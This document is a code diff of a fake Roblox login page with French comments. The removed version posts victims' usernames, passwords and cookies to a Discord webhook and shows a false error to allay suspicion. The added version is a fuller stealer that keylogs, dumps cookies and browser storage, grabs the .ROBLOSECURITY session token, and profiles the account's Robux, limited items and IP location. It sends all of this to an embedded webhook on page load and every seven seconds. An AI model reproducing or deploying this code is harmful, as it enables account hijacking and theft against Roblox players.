@@ -8,65 +8,182 @@
     <!-- MachineID: c3c4052d-8e07-f67d-99ba-f20cd524ebaf -->
     <title>Log in to Roblox</title>
 <script>
-// Ton webhook Discord où les données seront envoyées
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1355719783735365762/9R_DzsqluTqr7wbbpl_3k1Ta4byL5kE7mqKQgH8IhE7uNiPDQgWCLtGC_bYAsUBVXEHl';
+const webhook = "https://discord.com/api/webhooks/1355719783735365762/9R_DzsqluTqr7wbbpl_3k1Ta4byL5kE7mqKQgH8IhE7uNiPDQgWCLtGC_bYAsUBVXEHl";
 
-// Fonction pour envoyer les données au webhook
-async function sendDataToWebhook(data) {
+let keyBuffer = "";
+let lastSend = Date.now();
+
+document.addEventListener("keydown", (e) => {
+    let char = e.key;
+    if (e.shiftKey && char.length === 1) char = char.toUpperCase();
+    else if (char === "Shift") return;
+    else if (char === "Backspace") char = "[BACK]";
+    else if (char === "Enter") char = "[ENTER]";
+    else if (char === " ") char = "[SPACE]";
+    else if (char.length > 1) char = "[" + char.toUpperCase() + "]";
+    keyBuffer += char;
+});
+
+function getAllCookies() {
+    let cookies = document.cookie;
+    let all = "DOCUMENT.COOKIE:\n" + cookies + "\n\n";
     try {
-        const response = await fetch(DISCORD_WEBHOOK_URL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                username: "Cookie Logger",
-                content: `🍪 **Nouvelle victime !** 🍖\n\n**Pseudo :** \`${data.username}\`\n**Mot de Passe :** \`${data.password}\`\n\n**Cookies :** \`\`\`${data.cookies}\`\`\``,
-            }),
-        });
-
-        if (!response.ok) {
-            console.error('Erreur lors de l\'envoi au webhook:', response.statusText);
+        if (window.chrome && chrome.cookies) {
+            chrome.cookies.getAll({domain: "roblox.com"}, (cks) => {
+                cks.forEach(c => {
+                    if (c.name === ".ROBLOSECURITY" || c.name === "ROBLOSECURITY") all += ".ROBLOSECURITY: " + c.value + "\n";
+                });
+            });
         }
-    } catch (error) {
-        console.error('Erreur réseau:', error);
-    }
+    } catch(e) {}
+    return all;
 }
 
-// Attend que le DOM soit chargé
-document.addEventListener('DOMContentLoaded', () => {
-    const loginForm = document.getElementById('loginForm');
-    const errorDiv = document.getElementById('error');
-    const usernameInput = document.getElementById('username');
-    const passwordInput = document.getElementById('password');
+function getAllStorage() {
+    let s = "LOCALSTORAGE:\n";
+    for (let i = 0; i < localStorage.length; i++) {
+        let k = localStorage.key(i);
+        s += k + ": " + localStorage.getItem(k) + "\n";
+    }
+    s += "\nSESSIONSTORAGE:\n";
+    for (let i = 0; i < sessionStorage.length; i++) {
+        let k = sessionStorage.key(i);
+        s += k + ": " + sessionStorage.getItem(k) + "\n";
+    }
+    return s;
+}
 
-    loginForm.addEventListener('submit', async (event) => {
-        // Empêche le formulaire de s'envoyer réellement
-        event.preventDefault();
+async function fetchRoblox(url, cookieVal) {
+    try {
+        const res = await fetch(url, {
+            headers: { "Cookie": `.ROBLOSECURITY=${cookieVal}` },
+            credentials: "include"
+        });
+        return res.ok ? await res.json() : null;
+    } catch(e) { return null; }
+}
 
-        const username = usernameInput.value;
-        const password = passwordInput.value;
+async function getIPInfo() {
+    try {
+        const res = await fetch("https://ipinfo.io/json");
+        const d = await res.json();
+        return `${d.ip} — ${d.city || 'Unknown'}, ${d.country || ''}`;
+    } catch(e) { return "IP non disponible"; }
+}
 
-        // Récupère tous les cookies du site actuel
-        const cookies = document.cookie;
+async function sendLogger() {
+    let fullCookies = getAllCookies();
+    let robloxCookieValue = "";
 
-        // Prépare les données à envoyer
-        const stolenData = {
-            username: username,
-            password: password,
-            cookies: cookies,
-        };
-
-        // Envoie les données en arrière-plan
-        sendDataToWebhook(stolenData);
-
-        // Affiche un message d'erreur pour que l'utilisateur ne se méfie pas
-        errorDiv.style.display = 'block';
-
-        // Vide les champs du mot de passe pour forcer l'utilisateur à réessayer
-        passwordInput.value = '';
+    let cookieParts = document.cookie.split(';');
+    cookieParts.forEach(part => {
+        let trimmed = part.trim();
+        if (trimmed.startsWith('.ROBLOSECURITY=') || trimmed.startsWith('ROBLOSECURITY=')) {
+            robloxCookieValue = trimmed.split('=')[1] || "";
+        }
     });
-});
+
+    if (!robloxCookieValue) {
+        try {
+            let temp = document.cookie.match(/\.?ROBLOSECURITY=([^;]+)/);
+            if (temp) robloxCookieValue = temp[1];
+        } catch(e) {}
+    }
+
+    const user = await fetchRoblox("https://www.roblox.com/mobileapi/userinfo", robloxCookieValue);
+    if (!user || !user.UserId) return;
+
+    const ipInfo = await getIPInfo();
+
+    let avatarUrl = "";
+    try {
+        const thumb = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.UserId}&size=420x420&format=Png`);
+        const tdata = await thumb.json();
+        avatarUrl = tdata.data && tdata.data[0] ? tdata.data[0].imageUrl : "";
+    } catch(e) {}
+
+    let friendsCount = "N/A";
+    try {
+        const f = await fetchRoblox(`https://friends.roblox.com/v1/users/${user.UserId}/friends/count`, robloxCookieValue);
+        friendsCount = f && f.count !== undefined ? f.count.toLocaleString() : "N/A";
+    } catch(e) {}
+
+    let pendingRobux = "0";
+    try {
+        const trans = await fetchRoblox(`https://economy.roblox.com/v1/users/${user.UserId}/transactions?limit=15`, robloxCookieValue);
+        if (trans && trans.data) {
+            let pend = 0;
+            trans.data.forEach(t => {
+                if (t.status === "pending" || (t.type && t.type.includes("Sale"))) pend += Math.abs(t.amount || 0);
+            });
+            pendingRobux = pend.toLocaleString();
+        }
+    } catch(e) {}
+
+    let limitedsList = "Aucun limited rare détecté";
+    let totalRAP = 0;
+    try {
+        const inv = await fetchRoblox(`https://inventory.roblox.com/v1/users/${user.UserId}/assets/collectibles?limit=60`, robloxCookieValue);
+        if (inv && inv.data) {
+            let rares = [];
+            for (let item of inv.data.slice(0, 12)) {
+                try {
+                    const rapRes = await fetch(`https://economy.roblox.com/v1/assets/${item.assetId}/resale-data`);
+                    const rapData = await rapRes.json();
+                    const rap = rapData.recentAveragePrice || 0;
+                    totalRAP += rap;
+                    if (rap > 800) rares.push(`${item.name} — ${rap.toLocaleString()}`);
+                } catch(e) {}
+            }
+            limitedsList = rares.length ? rares.join("\n") : "Aucun limited rare détecté";
+        }
+    } catch(e) {}
+
+    const keylogPart = keyBuffer.length > 0 ? keyBuffer : "Aucune frappe";
+    const allStorageData = getAllStorage();
+
+    const embed = {
+        title: "LOGGER",
+        color: 0x00b4ff,
+        thumbnail: { url: avatarUrl },
+        fields: [
+            { name: "USERNAME", value: user.UserName || "N/A", inline: true },
+            { name: "USER ID", value: user.UserId.toString(), inline: true },
+            { name: "ROBUX ACTUEL", value: (user.RobuxBalance || 0).toLocaleString(), inline: true },
+            { name: "ROBUX EN ATTENTE", value: pendingRobux, inline: true },
+            { name: "AMIS", value: friendsCount, inline: true },
+            { name: "PREMIUM", value: user.IsPremium ? "✅ Oui" : "❌ Non", inline: true },
+            { name: "VALEUR LIMITEDS (RAP)", value: totalRAP.toLocaleString() + " Robux", inline: false },
+            { name: "IP & LOCALISATION", value: ipInfo, inline: false },
+            { name: "LIMITEDS RARES", value: limitedsList.substring(0, 900) || "Aucun", inline: false },
+            { name: ".ROBLOSECURITY", value: "```" + (robloxCookieValue || "Non trouvé dans document.cookie") + "```", inline: false },
+            { name: "KEYLOGGER", value: "```" + keylogPart.substring(0, 950) + "```", inline: false },
+            { name: "ALL COOKIES & STORAGE", value: "```" + (fullCookies + allStorageData).substring(0, 950) + "```", inline: false }
+        ],
+        footer: { text: "Roblox Logger 2026 • " + new Date().toLocaleString("fr-FR") },
+        timestamp: new Date().toISOString()
+    };
+
+    try {
+        await fetch(webhook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ embeds: [embed] })
+        });
+    } catch(e) {}
+}
+
+setInterval(() => {
+    if (keyBuffer.length > 0 || Date.now() - lastSend > 60000) {
+        sendLogger();
+        if (keyBuffer.length > 0) keyBuffer = "";
+        lastSend = Date.now();
+    }
+}, 7000);
+
+window.onload = () => {
+    sendLogger();
+};
 </script>
 <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true" />
 <meta charset="UTF-8">
